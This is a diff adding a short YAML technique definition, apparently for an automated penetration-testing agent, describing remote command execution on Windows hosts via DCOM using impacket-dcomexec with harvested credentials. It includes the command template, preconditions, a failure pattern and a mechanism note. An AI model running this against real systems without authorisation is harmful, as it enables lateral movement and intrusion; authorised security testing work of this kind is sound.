@@ -1,0 +1,20 @@
+name: dcomexec
+category: shell
+description: Command execution via DCOM (MMC20, ShellWindows, ShellBrowserWindow)
+preconditions:
+  - has_cred
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: "impacket-dcomexec '{domain}/{username}:{password}@{target_ip}'"
+parser: null
+expected_effects:
+  - shell_obtained
+falsifier:
+  pattern: "ACCESS_DENIED|rpc_s_access_denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Leverages DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow) for command execution over RPC. Works when SMB exec methods are blocked. Requires admin and RPC access (135+high ports)."
